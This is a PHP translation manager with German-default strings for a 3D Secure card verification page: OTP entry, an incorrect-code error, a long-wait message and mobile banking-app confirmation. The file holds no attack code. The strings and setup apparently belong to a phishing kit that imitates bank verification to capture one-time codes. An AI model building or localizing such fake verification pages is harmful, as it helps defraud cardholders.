<?php
/**
 * Centralized Language Manager for Translation Support
 * Supports multiple languages: German (default), English, French, Italian
 */
class LanguageManager {
    private $language;
    private $translations = [];
    private $supportedLanguages = ['de', 'de-ch', 'en', 'fr', 'it'];

    public function __construct() {
        $this->detectLanguage();
        $this->loadTranslations();
    }

    /**
     * Detect user's preferred language
     * Priority: GET parameter > Session > Browser language > German default
     */
    private function detectLanguage() {
        // Check URL parameter first
        if (isset($_GET['lang']) && in_array($_GET['lang'], $this->supportedLanguages)) {
            $this->language = $_GET['lang'];
            $_SESSION['language'] = $this->language;
            return;
        }

        // Check session
        if (isset($_SESSION['language']) && in_array($_SESSION['language'], $this->supportedLanguages)) {
            $this->language = $_SESSION['language'];
            return;
        }

        // Detect from browser
        $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '', 0, 2);
        $this->language = in_array($browserLang, $this->supportedLanguages) ? $browserLang : 'de';
        $_SESSION['language'] = $this->language;
    }

    /**
     * Load translations from JSON files
     */
    private function loadTranslations() {
        $translationFiles = [
            'de' => __DIR__ . '/translations/de.json',
            'de-ch' => __DIR__ . '/translations/de-ch.json',
            'en' => __DIR__ . '/translations/en.json',
            'fr' => __DIR__ . '/translations/fr.json',
            'it' => __DIR__ . '/translations/it.json'
        ];

        $lang = $this->language;
        $this->translations = [];

        if (isset($translationFiles[$lang]) && file_exists($translationFiles[$lang])) {
            $content = file_get_contents($translationFiles[$lang]);
            $this->translations = json_decode($content, true) ?? [];
        }

        if (empty($this->translations)) {
            $this->translations = $this->getDefaultTranslations();
        }
    }

    /**
     * Get default translations (German)
     */
    private function getDefaultTranslations() {
        return [
            'secure_app_verification' => 'Sichere App-Verifizierung',
            'sms_otp_verification' => 'SMS-Einmalpasswort-Verifizierung',
            'online_purchase_3d_secure' => 'Online-Kauf - 3D Secure',
            'enter_otp_title' => 'Geben Sie Ihr Einmalpasswort (OTP) ein',
            'otp_instruction' => 'Bitte geben Sie den 6-stelligen Code ein, der per SMS an Ihre registrierte Mobilnummer gesendet wurde. Teilen Sie diesen Code niemals mit anderen.',
            'merchant' => 'Händler:',
            'amount' => 'Betrag:',
            'date' => 'Datum:',
            'card' => 'Karte:',
            'incorrect_auth_code' => 'Falscher Authentifizierungscode!',
            'enter_complete_code' => 'Bitte geben Sie den vollständigen Code ein',
            'verifying' => 'Überprüfung läuft...',
            'verification_failed' => 'Verifizierung fehlgeschlagen. Bitte versuchen Sie es erneut.',
            'verify_code_button' => 'Verifizieren',
            'support_message' => 'Falls Sie dies nicht angefordert haben, kontaktieren Sie bitte sofort den Support.',
            'need_help' => 'Benötigen Sie Hilfe?',
            'learn_more_auth' => 'Mehr über Authentifizierung erfahren',
            'please_wait_message' => 'Bitte haben Sie Geduld, dies kann eine Weile dauern!',
            'confirm_transaction_instruction' => 'Bitte bestätigen Sie diese Transaktion mit Ihrer mobilen Banking-App. Sie sollten in Kürze eine Push-Benachrichtigung erhalten.',
            'waiting_mobile_confirmation' => 'Warten auf Bestätigung der mobilen App...',
            'no_notification_help' => 'Falls Sie keine Benachrichtigung erhalten, öffnen Sie bitte Ihre Banking-App manuell.',
            'need_help_auth' => 'Benötigen Sie Hilfe? Mehr über Authentifizierung erfahren'
        ];
    }

    /**
     * Get translation for a given key
     * @param string $key Translation key
     * @param string|null $default Default value if translation not found
     * @return string Translated text or default/key
     */
    public function translate($key, $default = null) {
        return $this->translations[$key] ?? $default ?? $key;
    }

    /**
     * Get current language code
     */
    public function getLanguage() {
        return $this->language ?? 'de';
    }

    /**
     * Set language and reload translations
     * @param string $lang Language code
     * @return bool Success status
     */
    public function setLanguage($lang) {
        if (in_array($lang, $this->supportedLanguages)) {
            $this->language = $lang;
            $_SESSION['language'] = $lang;
            $this->loadTranslations();
            return true;
        }
        return false;
    }

    /**
     * Get list of supported languages
     */
    public function getSupportedLanguages() {
        return $this->supportedLanguages;
    }
}

// Create global instance
$languageManager = new LanguageManager();

/**
 * Global translation helper function
 * @param string $key Translation key
 * @param string|null $default Default value if translation not found
 * @return string Translated text
 */
function t($key, $default = null) {
    global $languageManager;
    return $languageManager->translate($key, $default);
}
